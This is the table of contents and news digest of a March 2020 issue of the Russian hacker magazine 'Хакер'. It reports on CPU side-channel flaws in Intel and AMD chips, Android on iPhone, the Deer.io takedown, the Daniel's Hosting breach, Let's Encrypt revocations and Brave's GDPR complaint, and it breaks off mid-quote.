
                                                 Март 2020
            № 252
CONTENTS

    MEGANews
  Всё новое за последний месяц

     Android
  Уязвимость в смар тфонах на про цессорах MediaTek и Android для iPhone

    Чемоданчик хакера 2020
  Выбира ем инстру мен ты, которые хорошо иметь под рукой

    По коряем веб
  Как применять OWASP Testing Guide v4 в 2020 году

    Сбор учеток в Active Directory
  Как искать критичес ки важ ные дан ные при ата ке на домен

    Защита от детек та в Active Directory
  Как обмануть средс тва обна ружения при ата ке на домен

   Шиф рование по-индийски
  Взла мыва ем Tally ERP 9: ана лог 1С из стра ны кон трас тов

    Арсенал пен тесте ра
  Со бира ем утилиты для детекта операционки на уда ленном хосте

    Зах ват поддоменов
  Как я захватил под домены Microsoft и как работа ют такие ата ки

    Фун дамен тальные осно вы хакерства
  Иден тифика ция стар тового кода и вир туальных функций приложений под Win64

    От вратитель ная чет верка
  Тестируем новые бес плат ные антивирусы Huorong, Preventon, Zoner и FS Protection

    Досим ModSecurity
  Как работа ет критический баг в популярном WAF

    Кот-призрак
  Как эксплуати ровать новую RCE-уязвимость в веб-сервере Apache Tomcat

    Рулим дотфайлами
  Как быстро повысить ком форт в любом Linux или WSL

    Ни еди ного раз рыва
  Пишем на C# утилиту для монито рин га сети

     Floppy Bird
  Пишем на ассем блере клон игры Flappy Bird, который уместится в бутсектор

    Reverse shell на Python
  Осваиваем навыки работы с сетью на Python на примере обратно го шелла

   Малень кие сек реты сетевых ути лит
  Интерпретиру ем вывод ping, traceroute и whois для отладки

    Игры с неведомым
  Как устроены хакер ские квесты и почему от них тяжело оторваться

    Игры в компь ютер
  Обзор игр, которые не только развлекут, но и обучат важным навыкам

     Тит ры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





НОВЫЕ ДЫРЫ
В ПРОЦЕССОРАХ
Редкий месяц в последние годы обходится без новостей об очередных уяз‐
вимостях,  обнаруженных  в  про цес сорах  крупнейших  производителей.
Но март 2020 года оказался особен но богат на такие проблемы.


Intel
В начале месяца эксперты компании Positive Technologies сообщили, что
исправленная в прошлом году уяз вимость в процессорах  Intel оказалась
гораздо опаснее, чем считалось изначально. Речь идет о проб леме CVE‐
2019‐0090, которая связана с работой Intel Converged Security and Manage‐
ment Engine (CSME), ранее называвшегося Intel BIOS Management Extension
(Intel MEBx). Большинство чипсетов Intel, выпущенных за последние пять лет,
уязвимы перед этим багом.
   Эксплуатируя баг, локальный зло умышленник может извлечь корневой
ключ платформы (chipset key), который записан в микросхе ме PCH, и получить
доступ к зашифрованным этим ключом данным. При этом невоз можно зафик‐
сировать сам факт утечки ключа. Имея корневой ключ, злоумышленник может
не только расшифровать данные, хранящиеся на целевом компьютере, но и
подделать его аттестацию, которая основана на схеме EPID (Enhanced Privacy
ID), — то есть выдать свой компьютер за ПК жертвы. Данная схема исполь‐
зуется в работе технологии DRM, а также для обеспечения безопасности
банковских транзакций и аттеста ции интернета вещей.
   Учитывая, что фундаментально исправить данную проблему, внеся изме‐
нения в ROM чипсета, невозможно, эксперты Positive Technologies рекомен‐
дуют отключить технологию шифрования носителей информации, исполь‐
зующую подсистему Intel CSME, или рассмотреть возможность заменить парк
компьютеров на ПК с процессорами Intel 10‐й серии и выше.
  Затем, в середине месяца, сводная команда ученых из Вус терского
политехнического института, Грацско го техничес кого университета, Универ‐
ситета Мичигана, Университета Аделаиды, а также эксперты компании Bitde‐
fender рассказали о новой проблеме, которая также угрожает процессорам
компании Intel.
  Новые атаки получили наз вание Load Value Injection (LVI), и, хотя инженеры
Intel уже выпустили софтверные исправления, полное устранение этих проб‐
лем таким образом невоз можно — в будущем процессорам компании пот‐
ребуются аппаратные изменения. LVI‐атаки во многом являются «нас ледни‐
ками» нашумевших в 2018 году уязвимос тей Meltdown и Spectre (в основном
Meltdown), отталкиваясь от которых специалис ты выявили множество других
side‐channel‐проблем, вклю чая  Spoiler, RIDL,  Fallout и ZombieLoad, Zom‐
bieLoad 2, NetCAT, TPM‐FAIL, Plundervolt.
   Как объяснили эксперты, LVI — это своего рода Meltdown наоборот. Так,
если проблема Meltdown позволяла зло умышленникам извлекать данные
приложений в памяти ЦП, то ата ки LVI предос тавляют возможность внедрять
код в ЦП и выпол нять его как transient‐операцию, что дает злоумышленнику
контроль над ситуацией.
   Тесты, выполненные дву мя исследова тельскими группами, которые обна‐
ружили проблему  LVI независимо друг от дру га, хорошо иллюс трируют
широкий спектр воздействия новой угрозы. Нап ример, ученые сос редото‐
чились на вопросах утечек данных (ключей шифрования) из анклавов Intel
SGX,  тогда  как  инженеры  Bitdefender  концентри ровались  на  атаках
на облачные среды.





В настоящее время реальными тестами подтверждено, что атаки LVI пред‐
ставляют угрозу для процес соров Intel, одна ко исследователи не исключают,
что решения AMD и ARM, а также любые процес соры, уязвимые перед утеч‐
ками данных по прин ципу Meltdown, тоже могут быть подвержены новой проб‐
леме. Кроме того, сооб щается, что, согласно предварительным тестам, уже
выпущенные Intel софтверные патчи серь езно влияют на производительность.
Так,   установка   исправлений   может   сни зить   производительность
от 2 до 19 раз.



      «Чтобы вос пользоваться этой уяз вимостью на прак тике, необходимо
      соблюдение многочис ленных сложных условий. Intel не рас ценива ет
       LVI как применимый в реальной прак тике способ дос тупа, если опе-
      рационная сис тема и дис петчер вир туальных машин не были ском про-
      метирова ны.  Пользовате лям  уже  дос тупны  новые  рекомендации
      и  инс тру менты,  которые  в  сочета нии  с пред став ленны ми  ранее
      обновле ниями сущес твенно снижают общую повер хность ата ки. Мы
      бла года рим иссле дова телей, которые работа ли с нами, а так же наших
      пар тне ров по отрасли за их вклад в скоординированное рас кры тие
     информа ции по этой проблеме. Применительно к SGX: чтобы снизить
      потенциальные воз можнос ти для использования механиз ма Load Value
        Injection (LVI) на платформах и в приложе ниях с под дер жкой Intel SGX
      кор порация Intel с сегод няшне го дня выпус кает обновле ния для прог-
     рам много обес печения SGX Platform и соответс тву юще го SDK.  Intel
     SGX SDK содер жит рекомендации по минимизации уяз вимос ти LVI
      для раз работчиков приложе ний Intel SGX», — ком ментируют предста-
      вите ли Intel.

Но и на этом плохие для Intel новости не закончились. Вскоре инженер Ama‐
zon Web Services (AWS) Павел Визоркевич сооб щил о еще одной уязвимости.
Созданная исследователем ата ка получила наз вание Snoop Assisted L1 Data
Sampling (или просто Snoop) и идентифика тор CVE‐2020‐0550.
  Новая атака эксплуатирует преимущес тва таких современных процес‐
сорных механизмов,  как несколько уровней кеша, когерентность кеша
и отслеживание шины (bus snooping, отсюда и происходит название атаки).
Так, в настоящее время большинство процессоров используют несколько
уровней кеша для хранения данных во время их обработки. Наиболее часто
используется уровень L1, который разделен на две части: одна для обработки
пользовательских данных (L1D), а вторая для обработки кода инструкций ЦП
(L1I). Из‐за исполь зования мно гоядерных архитектур и нескольких уровней
кеша данные зачастую хра нятся одновременно в нес кольких кешах ЦП и даже
в RAM.





Визоркевич обнаружил, что при определен ных усло виях вредоносный код
может подключиться к операции отслеживания шины и спровоцировать воз‐
никновение ошибок, что в ито ге приведет к утечке данных через когерен‐
тность кеша. При этом исследова тель отмечает, что атаку крайне трудно
реализовать на практике и она в любом случае не поз волит похитить большие
объемы данных (в отличие от оригинальных уязвимостей Meltdown и Spectre).
   Изучив проблему, раз работчики Intel пришли к выводу, что против нее
помогут исправления, выпущен ные еще в августе 2018 года для уяз вимос ти
Foreshadow (L1TF). Также сооб щается, что защитить ся поможет отключение
функции Intel TSX (Transactional Synchronization Extensions), что сделает реали‐
зацию Snoop еще сложнее и маловероятнее.


AMD
Об уязвимостях в процес сорах AMD приходится слышать реже, однако
на  этот  раз  баги  коснулись и  их. Сводная  группа специалис тов  из
Национального центра научных исследований Франции и Грацского тех‐
нического университета опубликовала доклад, посвященный новым векторам
атак  на  процессоры AMD.  Эти проб лемы,  обнаруженные  экспертами
еще в 2019 году, влияют на безопас ность данных, обрабаты ваемых процес‐
сорами, и могут привести к хищению конфиденциаль ной информации, а так‐
же ухудшению безопасности.
  Сообщается,  что багам подвержены про цес соры AMD, выпущенные
в период между 2011 и 2019 годами (таблицу можно увидеть ниже). Более
того, исследователи уведомили инженеров AMD о своих выводах еще в
августе 2019 года, одна ко компания не сочла нужным выпус кать патчи, так
как не считает эти проблемы новыми спекулятивными (или упреждающими —
speculative) атаками. Исследова тели с этим, конечно же, не согласны.





Обнаруженные специалистами проблемы затрагива ют механизм предска‐
зания ветвления (way predictor) в кеше данных первого уровня L1D. Эта ори‐
ентированная на производитель ность функциональ ность была пред ставлена
в процессорах AMD в 2011 году, она поз воляет снизить энергопотребление.
Так, согласно опубликованному докладу, way predictor вычисляет μTag, при‐
меняя для этого недокументированную хеш‐функцию к виртуальному адресу.
Затем μTag используется для определения канала кеша по таблице. То есть
процессор должен сравнивать тег кеша не со всеми возможны ми варианта‐
ми, что позволяет уменьшить потребление энергии.
  Иссле дователям удалось отреверсить упомянутую «недокументированную
функцию», которую использовали процес соры AMD, и обнаружить два век‐
тора атак: Collide + Probe и Load + Reload. Эти side‐channel‐атаки во многом
похожи на классические Flush + Reload и Prime + Probe, которые ранее уже
использовались другими ИБ‐экспертами для извлечения данных из процес‐
соров Intel.
  При этом авторы доклада уверены, что обна руженные ими проблемы отли‐
чаются от прочих атак по сторонним каналам. Так, по их мнению, Collide +
Probe и Load + Reload — не теоретические атаки, а проб лемы, которые могут
быть легко использованы в реальной жизни, и для этого злоумышленни ку
не понадобится физический доступ или специаль ное оборудование. К при‐
меру, эксперты уверяют, что экс плуатировали атаки в облачной среде
с помощью JavaScript.
   Так, в ходе одного эксперимента на процес соре AMD удалось запус тить
вредоносный процесс, который использовал скрытый канал извлечения дан‐
ных для хищения данных из другого процесса. Скорость «слива» данных сос‐
тавила 588,9 Кбайт/с.
   Атаку Collide + Probe уда лось приспособить для уменьшения энтропии
в различных имплементациях ASLR (Address Space Layout Randomization).
Если же злоумышленник смог обойти защиту ASLR, он фактически получает
возможность предсказывать, где выпол нится тот или иной код, и планировать
дальнейшие атаки.
  Иссле дователи заявили, что скомпромети рова ли ядро ASLR в полностью
обновленной Linux‐системе, а также ASLR для операционных систем и при‐
ложений, работающих в облачных и виртуальных средах. Данные атаки пот‐
ребовали внедрить вредоносный код на целевую машину, однако сообщает‐
ся, что атака возможна и через интернет — если использовать вредонос ный
JavaScript в браузере. Кроме того, ата ку Collide + Probe успешно применили
для восстановления клю ча шифрования из имплементации AES T‐table.





     «Мы  проверили  наш   proof-of-concept   в  бра узе рах  Chrome
      76.0.3809 и Firefox 68.0.2, а так же на движке Chrome V8. В Firefox мы
      смогли уменьшить энтропию на 15 бит с вероятностью успе ха 98%
      и сред ним вре менем выполнения 2,33 с (σ = 0,03  с, n = 1000).
     В Chrome мы добились вероятности успе ха 86,1% и сред него вре мени
      выполнения 2,90 с (σ = 0,25 с, n = 1000)», — пишут экспер ты.

Официальное сообщение AMD гласит, что компания не считает описанные
проблемы новыми спекулятивными ата ками, так как эти проблемы можно
решить, установив другие, выпущенные ранее исправления для старых side‐
channel‐проблем. Напомню, что в прошлые годы процессоры AMD были
признаны уязвимыми перед такими side‐channel‐проблемами, как Spectre v1
(CVE‐2017‐5753), Spectre v1.1 (CVE‐2018‐3693), Spectre v1.2, Spectre v2 (CVE‐
2017‐5715), CVE‐2018‐3640, SpectreNG (CVE‐2018‐3639), SpectreRSB, Net‐
Spectre, а также комплексом багов L1TF (L1 Terminal Fault) или Foreshadow.
  В свою очередь, исследова тели заверили журналистов издания ZDNet, что
ответ AMD «весьма обманчив» и ком пания никак не взаимодействовала
с командой специалистов с августа прошлого года, то есть с момента приват‐
ного раскрытия информации о проблемах. К тому же сами атаки якобы по сей
день работают на полностью обновлен ных ОС, с новейшими прошивками
и ПО.


НА 775% ВЫРОСЛА НАГРУЗКА НА ОБЛАЧНЫЕ СЕРВИСЫ
MICROSOFT

Из‐за пандемии коронавируса наг рузка на облачные сервисы компании Microsoft уве личилась
на 775% в регионах, где введено принудитель ное социальное дис танцирование и само изо‐
ляция. Это более 44 миллионов пользователей в день.

Использование Windows Virtual Desktop возросло в 3 раза.

Несмотря на значительное увеличение спроса, пока компания сумела избежать сущес твен ных
перебоев в обслужива нии. Если же говорить об ограничениях, пока они незначительны: нап‐
ример, компания слегка ограничила бесплатные предложения (чтобы сущес твующие клиенты
были в приоритете), а пользователям Xbox Live зап ретили менять изображения в профилях.





ANDROID
ДЛЯ IPHONE
Эта история началась с того, что осенью прошлого года хакер axi0mX обна‐
ружил уязвимость checkm8 и объяснил, как мож но использовать ее на благо
прогрессивной общественности. Дело в том, что это первая аппаратная уяз‐
вимость в BootROM, обна руженная за много лет: пос ледний джей лбрейк,
эксплуатирующий проблемы BootROM, был соз дан почти десять лет назад
известным хакером Джорджем Хотцем aka GeoHot.
  Джейлбрейк checkra1n, пос троенный на базе checkm8, появил ся в нояб‐
ре 2019 года. В его создании принимала учас тие команда исследователей,
объединенная под общим названием checkra1n. В нее, помимо самого ax‐
i0mX и известного iOS‐исследователя и талантливого хакера Луки Тодеско,
входит еще как минимум десяток человек, о чем красноречиво свидетель‐
ствует раздел Credits на сайте группы.
   Теперь эксперты компании Corellium представили Project Sandcastle (про‐
ект «Песочный замок») — бета‐версию сборки Android, которую можно уста‐
новить на iPhone. Это стало воз можным бла года ря использованию checkra1n
и платформы виртуализации мобильных устройств Corellium. Напомню, что
Apple уже судит ся с компанией Corellium, раз бирательство началось еще в
прошлом году. Дело в том, что компания научилась создавать виртуальные
машины с iOS, а Apple не понравилось, что кто‐то, по сути, скопировал ее
операционную систему.
   Теперь же инженеры Corellium предлага ют энту зиастам на свой страх
и риск установить на iPhone 7 или iPhone 7 Plus (другие модели пока не под‐
держиваются) едва работа ющую сборку Android. Раз работчики рассказыва‐
ют, что колдуют над портированием Android на iPhone уже более десяти лет.
Пока многие компоненты не функциони руют, включая камеру, Bluetooth
и сотовые модемы. Также неизвес тно, как такой эксперимент может сказать‐
ся на батарее, производитель ности и других компонентах устройства. То есть
использовать для опытов основной телефон крайне не рекомендуется.





      «Там, где песоч ницы опре деляют пре делы и гра ницы, песоч ные зам ки
      дают воз можность соз дать что‑то новое, используя без гра нич ность
      своего воображения.  Project  Sandcastle —  это  соз дание  чего‑то
      нового на крем нии вашего оборудования. iPhone огра ничивает поль-
      зовате лей работой внутри песоч ницы. Но когда вы покупа ете iPhone,
       у вас есть железо iPhone. Android для iPhone даст вам воз можность
      использовать дру гую опе рационную сис тему на этом железе.
         Android для iPhone име ет много инте рес ных прак тичес ких примене-
      ний, от кримина лис тичес ких иссле дова ний до двойной загрузки эфе-
     мер ных устройств с целью борьбы с элек тронными отходами. Нашей
      целью всегда было прод вижение мобильных иссле дова ний, и нам
      не тер пится увидеть, что сообщес тво раз работчиков сможет пос тро-
      ить на этом фундаменте», — пишут инже неры Corellium.

Журналисты Forbes уже опробовали Project Sandcastle в деле. Демонстрацию
работы Android на iPhone мож но увидеть в этом ролике.


85% ТРЕКЕРОВ ПРИНАДЛЕЖАТ GOOGLE
Разработчики приватного поис ковика DuckDuckGo разместили в Сети спи сок веб‐трекеров
Tracker Radar. Tracker Radar содержит подробную информацию о поведе нии тре керов, в том
числе о распространенности, принадлежности, действиях с цифровым отпечатком, поведе нии
файлов cookie, политике конфиден циальнос ти, правилах для определенных ресурсов (за
исключением случаев взлома сайта) и дан ные о производительнос ти.

Список включает 5326 доменов, которые используются 1727 компаниями и организациями
для отслеживания активности пользователей.

На 29 758 сайтах (68%) был обнаружен «маячок» doubleclick.net. Он при надлежит компании
Google, которая также владеет 479 доменами из списка. А значит, в 98% слу чаев трекер
используется на сайтах, не принадлежащих Google.

В целом трекеры, принадлежащие Google, удалось найти более чем на 85% сайтов из пер‐
вых 50 тысяч топа, а ком пании Facebook — на 36% сайтов.





При этом сообщается, что лишь 19% пользовате лей исполь зуют защиту от тре керов.





DEER.IO БОЛЬШЕ НЕТ
В начале марта 2020 года американские правоохранители сообщили, что
в аэропорту имени Джона Кеннеди в Нью‐Йорке был арестован россиянин
Кирилл Викторович Фирсов, которо го считают оператором  платформы
для создания сайтов Deer.io.
  Мы рассказывали о Deer.io еще в 2016 году. Так, платформа существовала
с 2013 года и тогда поз воляла любому желающему за 500 рублей в месяц
запустить собственный интернет‐магазин. Работало все это подобно Word‐
Press: пользователю за плату предос тавляли хос тинг и дизайн.
  Еще три года назад исследова тели компании Digital Shadows писали, что
услугами сервиса пользуют ся более 1000 магази нов, которые уже принесли
своим операторам свыше 240 миллионов рублей, а сами создатели Deer.io
уточняли, что на самом деле магазинов нас читывается свыше 4000.
  Проблема заключалась в том, что в 2016 году исследователи обнаружили
на Deer.io магазины, которым скорее сто ило бы работать в даркнете, а ведь
правила платформы  (и законодательство РФ) запрещали продажу нар‐
котических веществ, программ, устройств и скриптов для любых видов взло‐
ма, все связанное с кардерс твом и финансовыми махинациями, DDoS‐услуги
и так далее.
  Эксперты утверждали, что администрация Deer.io сознательно закрывает
глаза на такую активность. Так, отчет Digital Shadows гласил, что площадка
прекрасно известна хакерам и активно рекламиру ется на форумах Xeksek,
AntiChat, Zloy и Exploit.
  Интересно, что пред ставители платформы категорически отвергали эти
обвинения, уве ряли СМИ, что Deer.io работает в соответс твии с законами
Российской Федерации, а также регулярно блокирует магазины, которые
занимаются продажей наркотиков или банковских аккаунтов, и банит магази‐
ны по распоряже нию Роскомнадзора или дру гих упол номоченных органов.
  Не менее интересно и то, что пос ле публикации материала о Deer.io
на нашем сайте операторы платформы угрожали «Хакеру» юридическим
преследованием.  Летом  2019  года  компания  вне запно  потребовала
от редакции удалить материал 2016 года на том основании, что в отчете Digi‐
tal Shadows отсутствовал скрин шот главной стра ницы каталога сайтов (на
котором было отчетливо видно, что топ‐10 магазинов торгуют исключительно
ворованными аккаунтами). Утверждалось, что скриншот сделали мы сами,
а значит, публикация «не имеет подтверждения и порочит деловую репутацию
компании».
   Теперь, после ареста Фирсова, Министерс тво юстиции США отчиталось
о ликвидации самого сайта. Домен был изъ ят в соответствии с пос тановлени‐
ем суда, и на главной странице сайта теперь красуется красноречивая заг‐
лушка.
  Правоохранители пишут, что на момент закрытия платформа исполь‐
зовалась для размещения более 24 тысяч магазинов, чьи суммарные доходы
составляли более 17 миллионов долларов. Создать собственный магазин
здесь мог любой желающий, достаточно было  заплатить 800 рублей
в месяц — в биткой нах или с помощью систем онлайн‐платежей, включая
WebMoney.
  Следователи рассказывают, что 4 марта 2020 года ФБР совершило «кон‐
трольную закупку» и приобрело около 1100 игровых аккаунтов в магазине AC‐
COUNTS‐MARKET.DEER.IS менее чем за 20 долларов США, оплатив покупку
криптовалютой. После оплаты пра воохранители действительно получили
учетные данные от аккаунтов игроков, включая имя пользователя и пароль
для каждой.
  Из 1100 этих учетных записей 249 ока зались взломанными учетными
записями неназванной компании. Данная компания подтвердила следствию,
что если хакер получал доступ к имени пользователя и паролю, то у него
появлялась возможность использовать эту учетную запись. При этом учетная
запись игрока обеспечивает доступ ко всей его меди атеке, а также час то
имеет связанные способы оплаты. То есть злоумышленник мог восполь‐
зоваться этим и совершать дополнительные покуп ки.
  Но только лишь этим «контрольная закуп ка» не ограничилась. Так, 5 мар‐
та 2020 года ФБР приобрело примерно 999 записей с личными данными
в магазине DEER.IO SHIKISHOP.DEER.IS (примерно за 170 долларов в биткой‐
нах), а также около 2650 записей с личными данными (примерно за 522 дол‐
лара в биткойнах). Используя приобретенную информацию, сле дователи
смогли узнать имена, даты рождения и номера социального страхования
для ряда лиц, проживающих в окру ге Сан‐Диего.



       «Deer.io был  круп нейшей центра лизованной  платформой,  которая
      облегча ла  продажу  ском прометированных  акка унтов  социальных
       сетей,  а  так же  финансовых  данных,  пер сональной  информа ции
      и взломанных компьюте ров. Захват этого прес тупного сайта — боль-
     шой шаг в деле сок ращения [оборота] похищенных данных, исполь-
      зуемых для атак на физичес ких и юридичес ких лиц в США и за
      рубежом», — резюмирует спе циальный агент ФБР Омер Мейзель.


БИЛЛ ГЕЙТС ПОКИНУЛ СОВЕТ ДИРЕКТОРОВ MICROSOFT
В середине марта стало извес тно, что Билл Гейтс покидает совет директоров Microsoft, чтобы
уделять больше времени своим благотворительным про ектам. Впрочем, это не означает, что
Гейтс вообще оставит компанию, — он по‐прежнему будет чис литься в штате, только теперь
в роли советника главы Microsoft Сатьи Надел лы.





→«Уход из совета директоров ни в коем случае не означает, что я ухо жу из компании. Mi‐
crosoft всегда будет важной частью моей жизни, и я продол жу сотрудничать с Сатьей и тех‐
ническим руководством, чтобы помогать фор мировать видение и дос тигать амбициозных
целей, стоящих перед ком панией. Относительно прог ресса компании и того, как она может
продолжать приносить пользу миру, я чувствую себя более оптимистично, чем когда бы то
ни было»
— Билл Гейтс





                                     Продолжение статьи →
← Начало статьи





 DH ЗАКРЫЛСЯ
 ПОСЛЕ ВЗЛОМА
  Один из крупнейших хостингов в даркнете, Daniel’s Hosting (DH), был взломан
   в ночь на 10 марта 2020 года. Неизвес тные получи ли доступ к бэкенду DH
  и удалили все связанные с хос тингом базы данных, а также учетную запись
  владельца.
     Разработчик DH Дэниел Вин зен (Daniel Winzen) рассказал в блоге, что
  обнаружил взлом только утром, ког да спа сать что‐либо уже было поздно.
  Дело в том, что хостинг умыш ленно не хранил резервные копии. Винзен
  сообщил, что пока ему только предсто ит выяс нить, как взломщик проник
   в бэкенд. Он пишет, что сейчас сос редоточен на других проектах и пов‐
  седневных делах, а DH — это скорее хобби, поэтому тратить слишком много
  времени на расследование он не планиру ет.
     Создатель Daniel’s Hosting подчеркивает, что взлом не затронул учетные
  записи пользователей, размещавших на DH свои ресурсы, но все же советует
  рассматривать случив шееся как утечку данных и рекомендует бывшим кли‐
  ентам сменить пароли (если они используют одни и те же комбинации учет‐
  ных данных для разных ресурсов).
    По словам разработчика, в обоз римом будущем DH вряд ли заработает
  снова.



        «Я  занима юсь  этим  проектом  в  свобод ное  вре мя,  параллельно
         с основной работой, и тра чу очень много вре мени на то, чтобы прос то
        под держивать сер вер в чис тоте от незаконных и мошенничес ких сай-
          тов. Я тра чу в десять раз больше вре мени на уда ление акка унтов, чем
        мог бы найти для продолжения раз работки. На данном эта пе я не пла-
        нирую продолжать этот хос тинг‑проект», — заяв ляет Винзен.

  При этом разработчик уверяет, что в целом хотел бы перезапустить сервис
  с новыми функциями и улучшениями, чтобы больше не приходилось тратить
  все свободное время на администрирова ние. Одна ко вряд ли это произой‐
  дет в ближайшие месяцы.
    Интересно, что это уже второй крупный взлом DH за последние полтора
   года. Так, в конце 2018 года хос тинг точно так же подвергся атаке, а неиз вес‐
  тным злоумышленникам удалось получить доступ к БД и попросту удалить все
   аккаунты,  включая   root‐аккаунт  сервера.   Тогда   в  офлайн  ушли
  более 6500 сайтов (так как резервных копий тоже не было).


  ОТКАЗ ПОСЛЕ 40 000 ЧАСОВ РАБОТЫ


   Компания  Hewlett  Packard  Enterprise  (HPE)  выпус тила  рекомен дации  по  безопасности
   и обновления прошивок для своих SAS SSD.


   Из‐за ошибки во встроенном ПО некоторые модели твер дотельных накопи телей компании
   могут выйти из строя после 40 000 часов работы (4 года, 206 дней и 16 часов пос ле ввода
   в эксплуатацию). Хуже того, после сбоя, если он все же произошел, ни сам SSD, ни данные
   на нем уже не могут быть вос становлены.


  В HPE подчеркивают, что некоторые модели продаются отдельно, но дру гие включены в состав
   других продуктов HPE, в том чис ле HPE ProLiant, Synergy, Apollo 4200, Synergy Storage Modules,
   D3000 Storage Enclosure и StoreEasy 1000 Storage.





 МИНУС 3 МИЛЛИОНА
 СЕРТИФИКАТОВ
  4 марта 2020 года разработчики Let’s Encrypt неожиданно сообщили, что
   будут вынуждены отозвать 3 048 289 сертификатов из‐за ошибки в коде.
  Проблема крылась  в  управляющем ПО  Boulder, которое используется
  для проверки поль зователей и их доменов перед выдачей сертификатов.
     Чтобы разобраться в проблеме, нужно понимать, что такое стандарт CAA
   (Certiﬁcate Authority Authorization). Он был утвержден еще в 2017 году и поз‐
  воляет владельцам доменов запретить удостоверяющим центрам выпускать
  сертификаты для своих доменов. По сути, владель цы доменов могут добавить
  специальное поле CAA (CAA ﬁeld) в DNS своего домена, и только удостоверя‐
  ющий центр, указанный в этом поле, может выдать домену сертификат. Все
  удостоверяющие центры (вклю чая Let’s Encrypt) обязаны следовать CAA,
   в соответствии с буквой закона, а в про тивном случае им грозят серьезные
  штрафы.
    Ошибка в коде Boulder, связанная с имплементацией CAA, появилась
  еще летом 2019 года и порой заставляла его игнорировать проверку CAA.



         «Если зап рос сер тифика та содер жал N доменных имен, для которых
         тре бова лась пов торная провер ка CAA, Boulder выбирал одно домен-
        ное имя и проверял его N раз. Фак тичес ки, если под писчик выполнял
         валида цию доменного име ни на вре мя  X, запись CAA для этого
        домена поз воляла выдать сер тификат  Let’s  Encrypt во вре мя  X.
        Но под писчик имел воз можность получить сер тификат, содер жащий
         это доменное имя, на период X + 30 дней, даже если поз же на это
        доменное имя была уста нов лена запись CAA, зап реща ющая выдачу
        сер тифика тов Let’s Encrypt», — объясняют раз работчики Let’s Encrypt.

  В итоге баг был исправлен, и теперь Boulder проверяет поле CAA корректно.
  Инженеры Let’s Encrypt успо коили, что, по их данным, проблемой никто
  не успел злоупотребить. Однако удос товеря ющий центр вынужден аннулиро‐
   вать все сертификаты, которые были выданы с нарушением проверок CAA,
   в соответствии с отраслевыми пра вила ми.
    По сути, из всех 116 миллионов активных в нас тоящее время сертифика‐
   тов только 2,6% были подвержены этой проб леме. Как уже было сказано
  выше, это 3 048 289 сертификатов от общего числа. Но отзывать их все сразу
  все же не стали.
    Дело в том, что раз работчики приш ли к выводу, что идею «сломать» так
  много сайтов и напугать их посетителей вряд ли можно считать хорошей.
  Поэтому было принято решение временно отложить обнуление пример‐
  но 1 300 000 сертификатов, тогда как 1 706 505 сертификатов были перевы‐
  пущены 4–5 мар та 2020 года, как и пла нировалось. Отзыв некоторых сер‐
  тификатов все же обещали продолжить, но лишь после того, как специалисты
  убедятся, что это «не будет бесполезным нарушением спокойствия веб‐поль‐
  зователей».



           «Let’s  Encrypt  пред лагает  только  сер тифика ты  со  сроком  служ-
       бы 90 дней, поэтому затронутые проблемой сер тифика ты, которые мы
        не можем отоз вать, относительно быс тро покинут эко сис тему», — так-
        же отме чают раз работчики.


  САМЫЕ ОПАСНЫЕ КАТАЛОГИ ПРИЛОЖЕНИЙ

   Компания RiskIQ подготовила отчет об угрозах среди мобиль ных приложений за 2019 год.
  В числе прочего эксперты компании изучили различные каталоги приложений для Android
   и составили рейтинг наиболее опас ных из них.





   Наиболее опасным из всех был признан 9Game.com — портал для загрузки бес плат ных игр
   под Android. Он занял первое мес то как каталог приложений с наибольшим количес твом новых
   загрузок малвари, а также пер вое место среди магазинов приложе ний с самой высокой кон‐
   центрацией малвари (ее составили 9Game, Feral, Vmall, Xiaomi и Zhushou).

  В 2019 году на 9Game было заг ружено 61 669 новых вредонос ных приложений.

   Второе место в рейтинге магазинов с наибольшим количес твом новых загрузок малвари
   с солидным отрывом занимает официальный магазин приложе ний Google Play Store: 25 647
   новых вредоносных приложений за год.

   Оставшиеся позиции делят между собой каталог Zhushou, принадлежащий Qihoo 360, каталог
   Feral, а также Vmall, созданный компанией Huawei.

   Google Play Store вообще не вошел в пятерку магазинов с наибольшей кон центрацией малвари.


  В целом количество занесенных в черный список приложений в Google Play Store снизилось
   на значительные 76,4% в 2019 году.





  Общее количество вредоносных приложений в мире снизилось на 20% и останови лось
   на отметке 170 796 (в 2018 году насчитывалось 213 279 вредонос ных приложений).





 GOOGLE НАРУШАЕТ
 GDPR
  Создатели браузера Brave обвинили компанию Google в нарушении одного
  из принципов Общего регламента защиты данных (GDPR), а именно той его
  части, которая связана с согласием, что требуется для сбора и обработки
  личных данных пользователей. С соответс твующей жалобой авторы Brave
  обратились в ирландскую Комиссию по защите данных.
     Разработчики пишут, что политика конфиденциальности Google нарушает
  принцип целевого ограничения GDPR, так как privacy policy компании нельзя
  назвать прозрачной: в этом документе нет явно го указания целей, ради
  которых вообще собира ются и обра батываются данные. Дело в том, что
  GDPR требует, чтобы компании и организации собирали и обрабаты вали лич‐
  ные данные пользователей только для конкретных целей, которые дол жны
  быть абсолютно ясны потребителям.
     Создатели Brave называ ют политику конфиденциальности Google и ее
  формулировки «безнадежно туманными и неоп ределенными» и отмечают, что
  приведенные причины для сбо ра данных (такие как «разработка новых сер‐
   висов») словно взяты из антипримеров GDPR, опи сывающих, как делать ни в
  коем случае не нужно. Также утвержда ется, что хотя Google показывает поль‐
  зователям персонализированную рекламу в соответствии с их инте ресами,
  информация о целях обра ботки данных и о причинах, по которым пользовате‐
  ли видят конкрет ную рекламу, не рас кры ваются.
    В своей жалобе представители Brave ссылают ся на собс твенное иссле‐
  дование под названием «Внутри черного ящика», в котором подробно опи‐
   сано, ради каких целей Google собирает персональ ные данные, используя
  интеграции  с  сайтами,  приложениями  и  операционными  сис темами.
  Документ гласит, что цели Google «нас только расплывчаты, что не имеют
  никакого смысла или предела… В результате компания получает внутренние
  данные, доступные для всех, что наруша ет принципы ограниче ния целей
  GDPR».
     Разработчики Brave про сят, чтобы Google предоставила пол ный и конкрет‐
  ный список целей для сбора и обра ботки пер сональ ных данных, а также соот‐
   ветствующие правовые обоснования для каждой из них. Сообщается, что
  Google якобы неоднократно отка зывала Brave в подробных объяснениях.



        «Проблема в том, что, когда вы не зна ете, что происходит с вашими
        данными, нет никакой ответс твенности, проз рачнос ти и контроля.
        Если  такая  ком пания,  как  Google,  может  опе рировать  данными
        по принципу free-for-all, то и защита данных, и GDPR — лишь приз-
         рачная фантазия», — заяв ляют в Brave.

  Представители Google уже ответили на эти обви нения, дав комментарий
  изданию The Register:



         «Эти неод нократные обвинения со стороны нашего ком мерчес кого
         конкурента не выдер жива ют серьезной провер ки. Двад цать миллионов
